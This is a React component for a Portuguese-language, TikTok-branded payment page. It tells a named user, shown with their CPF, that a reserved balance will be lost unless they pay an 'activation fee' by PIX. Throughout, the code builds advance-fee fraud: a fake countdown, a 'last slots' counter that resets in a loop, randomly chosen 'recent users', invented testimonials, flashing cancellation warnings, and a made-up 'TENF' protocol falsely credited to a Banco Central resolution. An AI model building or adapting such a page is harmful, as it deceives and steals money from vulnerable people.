import { useState, useEffect, useRef } from "react";
import { Loader2, ChevronRight, Shield, AlertTriangle, Lock, Zap, CheckCircle2, ChevronDown, X } from "lucide-react";
import { Accordion, AccordionItem, AccordionTrigger, AccordionContent } from "@/components/ui/accordion";
import tiktokLogo from "@/assets/tiktok-logo.png";
import testimonial1 from "@/assets/testimonial-1.jpg";
import testimonial2 from "@/assets/testimonial-2.jpg";
import testimonial3 from "@/assets/testimonial-3.jpg";

interface FunnelUpsellTENFProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; price?: string; anchorPrice?: string; discountLabel?: string; }

const TIMER_DURATION = 300; // 5 minutes

const FunnelUpsellTENF = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName, price = "R$ 42,91", anchorPrice = "R$ 97,90", discountLabel = "56% OFF" }: FunnelUpsellTENFProps) => {
  const [activationsLeft, setActivationsLeft] = useState(7);
  const [recentUser, setRecentUser] = useState("");
  const [timeLeft, setTimeLeft] = useState(TIMER_DURATION);
  const [balanceFlicker, setBalanceFlicker] = useState(false);
  const recentNames = ["Maria S.", "João P.", "Ana L.", "Carlos R.", "Fernanda M.", "Ricardo T.", "Patrícia G.", "Lucas H.", "Camila D.", "Bruno F."];

  const firstName = leadName ? leadName.split(" ")[0] : "";
  const maskCpf = (cpf: string) => cpf.length >= 11 ? `${cpf.slice(0, 3)}.***.***.${cpf.slice(-2)}` : cpf;

  const isUrgent = timeLeft <= 120;

  const formatTime = (s: number) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${String(m).padStart(2, "0")}:${String(sec).padStart(2, "0")}`;
  };

  // Timer regressivo
  useEffect(() => {
    const startKey = "tenf_countdown_start";
    let start = parseInt(sessionStorage.getItem(startKey) || "0", 10);
    if (!start) { start = Date.now(); sessionStorage.setItem(startKey, String(start)); }
    const tick = () => {
      const elapsed = Math.floor((Date.now() - start) / 1000);
      setTimeLeft(Math.max(0, TIMER_DURATION - elapsed));
    };
    tick();
    const interval = setInterval(tick, 1000);
    return () => clearInterval(interval);
  }, []);

  // Efeito dotação — saldo pisca em vermelho periodicamente
  useEffect(() => {
    const interval = setInterval(() => {
      setBalanceFlicker(true);
      setTimeout(() => setBalanceFlicker(false), 1200);
    }, 8000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => { const interval = setInterval(() => setActivationsLeft(prev => (prev <= 2 ? 7 : prev - 1)), 25000); return () => clearInterval(interval); }, []);
  useEffect(() => { const pick = () => setRecentUser(recentNames[Math.floor(Math.random() * recentNames.length)]); pick(); const interval = setInterval(pick, 12000); return () => clearInterval(interval); }, []);

  return (
    <div className="fixed inset-0 z-[80] bg-white overflow-y-auto pb-24">
      {/* Timer regressivo sticky */}
      <div className={`sticky top-0 z-50 ${isUrgent ? 'bg-red-600' : 'bg-gray-900'} text-white py-2 px-4 flex items-center justify-center gap-3 transition-colors duration-500`}>
        <AlertTriangle className={`w-4 h-4 ${isUrgent ? 'animate-pulse' : ''}`} />
        <span className="text-xs font-semibold">
          {isUrgent ? "⚠️ TEMPO QUASE ESGOTADO" : "Tempo restante para ativar"}
        </span>
        <span className={`font-mono text-sm font-bold px-2 py-0.5 rounded ${isUrgent ? 'bg-white/20 text-white' : 'bg-white/10'}`}>
          {formatTime(timeLeft)}
        </span>
      </div>

      {/* Header com saldo + efeito dotação */}
      <div className="bg-gray-50 pt-3 pb-4 px-4 border-b border-gray-200">
        <div className="max-w-md mx-auto flex flex-col items-center">
          <img src={tiktokLogo} alt="TikTok" className="h-7 object-contain mb-2" />
          {firstName ? (
            <>
              <p className="text-gray-500 text-[11px] mb-0.5">Saldo reservado para <strong className="text-gray-800">{firstName}</strong></p>
              <p className={`text-[28px] font-extrabold leading-none transition-all duration-500 ${balanceFlicker ? 'text-red-500 scale-105' : 'text-gray-900 scale-100'}`}>
                {balance}
              </p>
              {balanceFlicker && <p className="text-red-500 text-[10px] font-semibold mt-0.5 animate-pulse">⚠ Saldo será cancelado se não ativar</p>}
              {leadCpf && <p className="text-gray-400 text-[10px] mt-0.5">CPF: {maskCpf(leadCpf)}</p>}
            </>
          ) : (
            <>
              <p className="text-gray-400 text-[10px] mb-0.5">Saldo disponível</p>
              <p className={`text-[28px] font-extrabold leading-none transition-all duration-500 ${balanceFlicker ? 'text-red-500 scale-105' : 'text-gray-900 scale-100'}`}>
                {balance}
              </p>
            </>
          )}
        </div>
      </div>

      <main className="px-4 py-3 space-y-3 max-w-md mx-auto pb-6">
        {/* Efeito dotação — Recibo prévio */}
        {leadName && leadCpf && (
          <div className="bg-emerald-50 border border-emerald-200 rounded-xl p-3 border-dashed">
            <p className="text-emerald-700 text-[10px] font-bold uppercase tracking-wide mb-2">📄 Pré-comprovante de saque</p>
            <div className="space-y-1.5 text-[11px]">
              <div className="flex justify-between"><span className="text-gray-500">Beneficiário</span><span className="text-gray-800 font-semibold">{leadName}</span></div>
              <div className="flex justify-between"><span className="text-gray-500">CPF</span><span className="text-gray-800 font-semibold">{maskCpf(leadCpf)}</span></div>
              <div className="flex justify-between"><span className="text-gray-500">Valor</span><span className="text-emerald-700 font-bold">{balance}</span></div>
              <div className="flex justify-between"><span className="text-gray-500">Status TENF</span><span className="text-red-500 font-bold">❌ Pendente</span></div>
              <div className="flex justify-between"><span className="text-gray-500">Prazo</span><span className="text-red-500 font-semibold">{formatTime(timeLeft)}</span></div>
            </div>
          </div>
        )}

        {/* Alerta principal */}
        <div className="bg-red-50 border border-red-200 rounded-xl p-3">
          <div className="flex items-center gap-2 mb-1.5"><AlertTriangle className="w-4 h-4 text-red-500" /><span className="text-red-500 text-xs font-bold uppercase tracking-wide">⛔ Saque Bloqueado — Ação Imediata</span></div>
          <p className="text-gray-600 text-xs leading-relaxed">{firstName ? <><strong className="text-gray-900">{firstName}</strong>, seu</> : "Seu"} saque de <strong className="text-gray-900">{balance}</strong> será <strong className="text-red-600">CANCELADO PERMANENTEMENTE</strong> em {formatTime(timeLeft)} se o TENF não for ativado.</p>
        </div>

        {leadCpf && (<div className="bg-gray-50 rounded-lg p-2.5 flex items-center gap-2.5 border border-gray-200"><span className="text-sm">🪪</span><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{leadName || "Titular"}</p><p className="text-gray-400 text-[10px]">CPF: {leadCpf}</p></div><span className="text-emerald-600 text-[10px] font-bold">Verificado ✓</span></div>)}

        {/* Risco vs Benefício — cards lado a lado */}
        <div className="grid grid-cols-2 gap-2">
          <div className="bg-red-50 rounded-xl p-3 border border-red-200">
            <p className="text-red-600 text-[10px] font-bold uppercase mb-2">❌ Sem TENF</p>
            <div className="space-y-1.5">
              <div className="flex items-start gap-1.5"><X className="w-3 h-3 text-red-500 shrink-0 mt-0.5" /><span className="text-gray-600 text-[10px]">Saldo <strong className="text-red-600">cancelado</strong></span></div>
              <div className="flex items-start gap-1.5"><X className="w-3 h-3 text-red-500 shrink-0 mt-0.5" /><span className="text-gray-600 text-[10px]">Conta <strong className="text-red-600">irregular</strong></span></div>
              <div className="flex items-start gap-1.5"><X className="w-3 h-3 text-red-500 shrink-0 mt-0.5" /><span className="text-gray-600 text-[10px]">Valor <strong className="text-red-600">irrecuperável</strong></span></div>
            </div>
          </div>
          <div className="bg-emerald-50 rounded-xl p-3 border border-emerald-200">
            <p className="text-emerald-700 text-[10px] font-bold uppercase mb-2">✅ Com TENF</p>
            <div className="space-y-1.5">
              <div className="flex items-start gap-1.5"><CheckCircle2 className="w-3 h-3 text-emerald-500 shrink-0 mt-0.5" /><span className="text-gray-600 text-[10px]">Saque em <strong className="text-emerald-700">3 min</strong></span></div>
              <div className="flex items-start gap-1.5"><CheckCircle2 className="w-3 h-3 text-emerald-500 shrink-0 mt-0.5" /><span className="text-gray-600 text-[10px]">Conta <strong className="text-emerald-700">regularizada</strong></span></div>
              <div className="flex items-start gap-1.5"><CheckCircle2 className="w-3 h-3 text-emerald-500 shrink-0 mt-0.5" /><span className="text-gray-600 text-[10px]">Reembolso <strong className="text-emerald-700">garantido</strong></span></div>
            </div>
          </div>
        </div>

        {/* Vagas */}
        <div className="bg-red-600 border border-red-700 rounded-lg px-3 py-2.5 flex items-center justify-center gap-2"><div className="relative"><div className="w-2 h-2 bg-white rounded-full" /><div className="absolute inset-0 w-2 h-2 bg-white rounded-full animate-ping" /></div><span className="text-white text-[11px] font-bold">⚠️ ÚLTIMAS {activationsLeft} VAGAS — Após esgotar, saldo será cancelado</span></div>

        {/* Pricing card */}
        <div className="bg-gray-50 rounded-2xl p-4 border border-gray-200">
          <div className="flex items-center justify-between mb-1"><span className="text-gray-500 text-xs">Taxa única de ativação</span><span className="bg-emerald-100 text-emerald-700 text-[10px] font-bold px-2 py-0.5 rounded-full">{discountLabel}</span></div>
          <div className="flex items-baseline gap-2 mb-1"><span className="text-gray-300 text-sm line-through">{anchorPrice}</span><span className="text-gray-900 text-3xl font-extrabold">{price}</span></div>
          <p className="text-emerald-600 text-[11px] font-medium mb-1">✅ Reembolso automático em 2 min se o saque não cair</p>
          <p className="text-red-500 text-[10px] font-semibold">❌ {firstName ? `${firstName}, sem` : "Sem"} ativação = perda total do saldo de {balance}</p>
        </div>

        {/* FAQ Accordion */}
        <div className="bg-gray-50 rounded-xl p-3 border border-gray-200">
          <p className="text-gray-700 text-xs font-bold mb-2">Perguntas frequentes</p>
          <Accordion type="single" collapsible className="space-y-0">
            <AccordionItem value="q1" className="border-b border-gray-200">
              <AccordionTrigger className="py-2.5 text-gray-600 text-[11px] font-semibold hover:no-underline">O que é o TENF?</AccordionTrigger>
              <AccordionContent className="text-gray-400 text-[11px] leading-relaxed pb-2.5">É o Termo Eletrônico de Nota Fiscal, protocolo <strong>obrigatório</strong> regulamentado pelo Banco Central (Resolução nº 4.893). Sem ele, é <strong>impossível</strong> receber qualquer valor acima de R$ 1.500.</AccordionContent>
            </AccordionItem>
            <AccordionItem value="q2" className="border-b border-gray-200">
              <AccordionTrigger className="py-2.5 text-gray-600 text-[11px] font-semibold hover:no-underline">O que acontece se eu não ativar?</AccordionTrigger>
              <AccordionContent className="text-gray-400 text-[11px] leading-relaxed pb-2.5">Seu saldo será <strong>cancelado permanentemente em 24 horas</strong>. O sistema fiscal bloqueia a conta e o valor não pode ser recuperado após o cancelamento.</AccordionContent>
            </AccordionItem>
            <AccordionItem value="q3" className="border-b-0">
              <AccordionTrigger className="py-2.5 text-gray-600 text-[11px] font-semibold hover:no-underline">A taxa é reembolsável?</AccordionTrigger>
              <AccordionContent className="text-gray-400 text-[11px] leading-relaxed pb-2.5">Sim, 100% reembolsável. Se o saque não cair na sua conta, o valor volta automaticamente em até 2 minutos. <strong>Risco zero.</strong></AccordionContent>
            </AccordionItem>
          </Accordion>
        </div>

        {/* Testimonials */}
        <div className="bg-gray-50 rounded-xl p-3 border border-gray-200">
          <p className="text-gray-700 text-xs font-bold mb-2.5 flex items-center gap-1.5"><CheckCircle2 className="w-3.5 h-3.5 text-emerald-500" />Quem ativou, já sacou</p>
          <div className="space-y-2.5">
            {[{ img: testimonial1, name: "Camila R.", amount: "R$ 3.247", text: "Em 3 minutos caiu na conta!" }, { img: testimonial2, name: "Roberto M.", amount: "R$ 2.891", text: "Fiz na hora e recebi tudo." }, { img: testimonial3, name: "Lucas T.", amount: "R$ 1.956", text: "5 minutos e já tava no banco." }].map((t, i) => (
              <div key={i} className="flex items-center gap-2.5"><img src={t.img} alt="" loading="lazy" className="w-7 h-7 rounded-full object-cover shrink-0" /><div className="flex-1 min-w-0"><div className="flex items-center justify-between"><p className="text-gray-600 text-[11px] font-semibold">{t.name}</p><span className="text-emerald-600 text-[10px] font-bold">{t.amount} ✓</span></div><p className="text-gray-400 text-[10px] truncate">"{t.text}"</p></div></div>
            ))}
          </div>
        </div>

        <p className="text-gray-300 text-[9px] text-center pb-2">Taxa regulamentada pelo Banco Central do Brasil • Resolução nº 4.893</p>
      </main>

      {/* CTA Sticky fixo no rodapé */}
      <div className="fixed bottom-0 left-0 right-0 z-[90] bg-white border-t border-gray-200 shadow-[0_-4px_20px_rgba(0,0,0,0.1)] px-4 py-3">
        <div className="max-w-md mx-auto space-y-2">
          <button onClick={onGeneratePix} disabled={isGenerating} className="w-full py-4 rounded-xl bg-emerald-500 text-white font-bold text-base hover:brightness-110 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2 shadow-lg shadow-emerald-500/30" style={{ animation: isGenerating ? 'none' : 'ctaPulse 2s ease-in-out infinite' }}>
            {isGenerating ? (<><Loader2 className="w-4 h-4 animate-spin" />Gerando PIX...</>) : (<>LIBERAR MEU SAQUE AGORA<ChevronRight className="w-4 h-4" /></>)}
          </button>
          <div className="flex items-center justify-center gap-1.5"><Shield className="w-3 h-3 text-gray-300" /><span className="text-gray-400 text-[10px]">Pagamento seguro via PIX • Reembolso garantido</span></div>
        </div>
      </div>
    </div>
  );
};

export default FunnelUpsellTENF;
